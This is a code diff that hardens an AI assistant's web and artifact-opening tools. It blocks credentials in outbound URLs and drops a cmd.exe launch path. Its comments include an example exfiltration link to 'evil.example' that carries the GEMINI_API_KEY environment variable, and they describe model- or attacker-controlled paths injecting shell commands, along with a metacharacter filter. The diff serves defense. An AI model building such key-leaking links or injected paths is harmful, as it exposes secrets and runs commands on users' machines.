@@ -25,9 +25,12 @@ const { youtubeVideoId, OPEN_WEB_CODES } = require('../util/youtube-id');
 const ytEpisode = require('../util/youtube-episode'); // BUG-438
 const { ALL_ROUTES, SYNONYMS } = require('./routes');
 const { web_search } = require('./web-search');
+const { openUrlExternally } = require('./open-url');
+const { secretInOutbound, outboundRefusal } = require('./outbound-secret');
 const { vaultRelativePath, vaultUrl, vaultAgeHours } = require('./vault-url');
 const { visionThink } = require('./vision-call');
 const evidence = require('./evidence');
+const { remedy } = evidence;
 // BUG-407: open_web(browser:true)'s hand-off, including the named-browser route.
 const externalRoute = require('./open-external-route');
 // C1: job_status is the pull-side counterpart of the announcer's push-side
@@ -246,6 +249,32 @@ function buildTools(ctx) {
     });
   }
 
+  // BUG-468 (2026-10-06). The hand-off half of open_web(browser:true), shared with the
+  // youtube newtab result (YOUTUBE_MODE=newtab, and the no-embeddable fallback). That
+  // result used to go to the renderer, which has no newtab surface under Electron
+  // (media window takes only youtube/web; HUD window.open is denied), so nothing could
+  // ever play. With no opener (plain browser HUD) the HUD's own newtab branch can still
+  // window.open, so that path keeps the renderer; "unset" never fabricates a yes.
+  async function handToBrowser(target, title) {
+    var handoff = await externalRoute.performExternalOpen(target, { externalOpener: externalOpener });
+    if (!handoff.opened) {
+      return fail('could not open ' + target.href + ' in your browser: ' + (handoff.reason || 'no reason given')
+        + '. Use browser_navigate to drive a browser directly, or open it yourself.', OPEN_WEB_CODES.PROVIDER_ERROR);
+    }
+    return externalRoute.settleExternalOpen({
+      href: target.href, handoff: handoff,
+      payload: ok({ widgetType: 'newtab', url: target.href, title: title || target.href,
+        handedToBrowser: true, browser: handoff.browser || 'os-default', via: handoff.via, windowPidsMayBeStale: true }),
+    });
+  }
+  // DECISION 2026-10-06 (operator): with NO external opener installed (plain browser HUD) the
+  // renderer path is kept on purpose - pinned by the 'NO opener' tests in test/bug-468-*.
+  async function openNewtab(href, title) {
+    if (typeof externalOpener !== 'function') return openWebResult({ widgetType: 'newtab', url: href, title: title });
+    var target = externalRoute.resolveExternalTarget({ url: href });
+    return target.ok ? handToBrowser(target, title) : fail(target.reason, OPEN_WEB_CODES.BAD_REQUEST);
+  }
+
   // ---- open_web ----
   // Opens web content on the dashboard: YouTube videos (embed), weather cards,
   // search result cards, flight cards, or a general web page. The tool resolves
@@ -268,6 +297,11 @@ function buildTools(ctx) {
         return fail('open_web type must be one of ' + ALLOWED_TYPES.join('|') + ' (got "' + t + '"). To open or control the real browser, use browser_navigate or browser_tabs instead.', OPEN_WEB_CODES.BAD_REQUEST);
       }
       var q = String(query || '').trim();
+      // B2d: every type below puts url, query or location on the network (a
+      // search, an embed, a browser hand-off), so a credential in any of them
+      // is refused before a single branch runs.
+      var carried = secretInOutbound(url) || secretInOutbound(q) || secretInOutbound(location);
+      if (carried) return fail(outboundRefusal('that', carried), OPEN_WEB_CODES.BAD_REQUEST);
 
       // FIX-PLAN 3.3 (2026-08-17): the explicit in-tool route to the real
       // browser. Until now the only honest answer to "open this in my browser"
@@ -295,11 +329,6 @@ function buildTools(ctx) {
       if (browser) {
         var target = externalRoute.resolveExternalTarget({ url: url, query: q, browserName: browserName });
         if (!target.ok) return fail(target.reason, OPEN_WEB_CODES.BAD_REQUEST);
-        var handoff = await externalRoute.performExternalOpen(target, { externalOpener: externalOpener });
-        if (!handoff.opened) {
-          return fail('could not open ' + target.href + ' in your browser: ' + (handoff.reason || 'no reason given')
-            + '. Use browser_navigate to drive a browser directly, or open it yourself.', OPEN_WEB_CODES.PROVIDER_ERROR);
-        }
         // Handed to a browser process, which is not the same as "the operator
         // saw the page" — both routes resolve on ACCEPTANCE, not on render.
         // BUG-273 B2 separated the two halves: the hand-off IS confirmed and
@@ -310,14 +339,7 @@ function buildTools(ctx) {
         // settleExternalOpen reads the browser's own window title back and
         // returns verifiedOk when it can; every other path is the old verdict
         // with a sharper reason. See open-external-route.js for the numbers.
-        return externalRoute.settleExternalOpen({
-          href: target.href, handoff: handoff,
-          payload: ok({
-            widgetType: 'newtab', url: target.href, title: title || target.href,
-            handedToBrowser: true, browser: handoff.browser || 'os-default',
-            via: handoff.via, windowPidsMayBeStale: true,
-          }),
-        });
+        return await handToBrowser(target, title); // BUG-468: shared with the youtube newtab result; `await` keeps a thrown opener inside this try
       }
 
       // YOUTUBE — search for the video, extract ID, build embed URL or route to new tab per config
@@ -381,7 +403,7 @@ function buildTools(ctx) {
         // schema default in mythos/src/core/config/schema.js.
         var youtubeMode = (config && config.YOUTUBE_MODE) || 'electron';
         if (youtubeMode === 'newtab') {
-          return openWebResult({ widgetType: 'newtab', url: 'https://www.youtube.com/watch?v=' + candidates[0].id, title: candidates[0].title });
+          return await openNewtab('https://www.youtube.com/watch?v=' + candidates[0].id, candidates[0].title);
         }
 
         // Embeddability pre-check via YouTube's public oEmbed endpoint (no API
@@ -439,7 +461,7 @@ function buildTools(ctx) {
             // this path too.
             return fail(ytEpisode.episodeRefusal(q, { missing: { phrase: ytEpisode.describeMarkers(requestedEp) }, closest: null }), OPEN_WEB_CODES.NO_MATCH);
           }
-          return openWebResult({ widgetType: 'newtab', url: 'https://www.youtube.com/watch?v=' + fallback[0].id, title: fallback[0].title });
+          return await openNewtab('https://www.youtube.com/watch?v=' + fallback[0].id, fallback[0].title);
         }
         // enablejsapi=1 is required for the player to postMessage onReady/
         // infoDelivery — without it, web-panel.js's success detection never
@@ -543,7 +565,7 @@ function buildTools(ctx) {
           'instagram.com','github.com','linkedin.com','reddit.com','youtube.com','youtu.be','openai.com']; // its own entry — see BUGS.md
         for (var d = 0; d < NO_EMBED_DOMAINS.length; d++) {
           if (host === NO_EMBED_DOMAINS[d] || host.endsWith('.' + NO_EMBED_DOMAINS[d])) {
-            return openWebResult({ widgetType: 'newtab', url: url, title: title || parsed.hostname });
+            return await openNewtab(url, title || parsed.hostname); // BUG-468 gate B: same dead end as the youtube newtab
           }
         }
         return openWebResult({ widgetType: 'web', embedUrl: url, title: title || parsed.hostname });
@@ -620,14 +642,14 @@ function buildTools(ctx) {
         }
         rawPath = String(path).trim();
       }
-      // Reject shell metacharacters — this path becomes part of a shell command
-      // (cmd /c start on Windows, xdg-open on Linux). Without this, an LLM or
-      // attacker who controls the path can inject commands (&, |, ;, backticks,
-      // $() are all command separators/subshells). BUG-008: open_artifact is
-      // tiered T2 (leash/tiers.js) and auto-allows on every dispatch path, voice
-      // included — no confirm gate protects this call anywhere. This check (plus
-      // shell:false + explicit argv below) is the only line of defense, so it
-      // applies regardless of the caller.
+      // Reject shell metacharacters. BUG-008 added this when the path became
+      // part of a `cmd /c start` line; since B2c (2026-09-29) no shell runs it
+      // (open-url.js), so these characters can no longer inject a command. The
+      // filter is kept as it was — it now only narrows what a MODEL may type
+      // (a link it builds with "&" is refused; the signed vault link is built
+      // below, after this check). Loosening it is a separate change.
+      // open_artifact is tiered T2 (leash/tiers.js) and auto-allows on every
+      // dispatch path, voice included — no confirm gate protects this call.
       if (/[;&|`$()<>^]/.test(rawPath)) {
         return fail('Artifact path contains disallowed characters.');
       }
@@ -673,22 +695,20 @@ function buildTools(ctx) {
         } catch (err) {
           return fail(`Artifact exists but the dashboard server is not reachable at ${targetUrl} (${err.message}).`);
         }
+      } else if (!/^https?:\/\//i.test(rawPath)) {
+        // B2c (2026-09-29 audit): anything that is not a vault build is a web link
+        // or it goes to open_file, which has the file policy. It used to go to
+        // cmd /c start as it was — a file path there RAN whatever it named.
+        return { ok: false, result: `open_artifact opens builds in the vault (/vault/...) and web links; "${rawPath}" is neither. For a file on disk use open_file.`, remedy: remedy('open_file', { path: rawPath }, 'a file on disk opens through the file policy') };
       }
-      const platform = process.platform;
-      let cmd;
-      if (platform === 'win32') {
-        cmd = ['cmd', '/c', 'start', '', targetUrl];
-      } else if (platform === 'darwin') {
-        cmd = ['open', targetUrl];
-      } else {
-        cmd = ['xdg-open', targetUrl];
-      }
-      // spawn (async), NOT spawnSync — spawnSync blocks the entire event loop
-      // until the child exits, freezing the WS server and cortex tick. On Linux
-      // xdg-open can block for seconds. shell:false — we pass an explicit argv
-      // so no shell wrapping is needed; this is the injection-safe path.
-      const { spawn } = require('child_process');
-      const child = spawn(cmd[0], cmd.slice(1), { detached: true, stdio: 'ignore', shell: false });
+      // B2c: no cmd.exe (open-url.js). "cmd /c start" split this link at "&" — a
+      // signed vault link lost its &sig= and the browser got a 401 — and replaced
+      // %NAME% with MYTHOS's own environment variable, so a model-supplied
+      // "https://evil.example/?k=%GEMINI_API_KEY%" opened WITH THE KEY in it.
+      // Still async and detached: spawnSync would freeze the event loop.
+      const opened = openUrlExternally(targetUrl);
+      if (!opened.ok) return fail(`Could not open artifact: ${opened.reason}`);
+      const child = opened.child;
       // REMEDIATION P1-6: the spawn error was previously swallowed entirely
       // ("best-effort") — an opener that fails to even launch (missing OS
       // handler, bad path) still reported opened:true with no trace anywhere.
@@ -701,7 +721,6 @@ function buildTools(ctx) {
           ctx.bus.emit('health.anomaly', { kind: 'open-artifact-spawn-failed', error: err.message, path: rawPath });
         }
       });
-      child.unref();
       const display = title || rawPath;
       return ok({ opened: true, url: targetUrl, display, ageHours: vaultRelPath === null ? null : vaultAgeHours(vaultRelPath, fs) }); // BUG-319
     } catch (err) {
